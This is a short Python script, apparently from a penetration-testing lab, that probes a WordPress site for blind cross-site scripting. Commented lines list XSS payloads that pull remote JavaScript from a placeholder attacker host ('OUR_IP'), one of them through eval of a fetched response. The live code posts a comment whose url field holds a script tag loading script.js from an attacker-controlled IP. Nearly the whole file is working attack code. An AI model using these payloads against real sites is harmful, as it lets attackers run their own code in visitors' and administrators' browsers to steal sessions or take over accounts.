import requests

# testing the search field
# ========================
# url = "http://10.129.160.134/assessment/"
# params = {
# 	"s": "<img src=x onerror=alert(1)>"
# }


# testing comment field
# =====================

# Payloads to test
# ================
# <script src=http://OUR_IP></script>
# '><script src=http://OUR_IP></script>
# "><script src=http://OUR_IP></script>
# javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
# <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
# <script>$.getScript("http://OUR_IP")</script>

url = "http://10.129.160.134/assessment/wp-comments-post.php"
IP = "10.10.14.114"
data = {
	"comment": "Comment",
	"author": "author",
	"email": "test@test.com",
	"url": f"<script src=http://{IP}/script.js></script>",
	"submit": "Post comment",
	"comment_post_ID": 8,
	"common_parent": 0
}

r = requests.post(url, data=data)

print(r.text)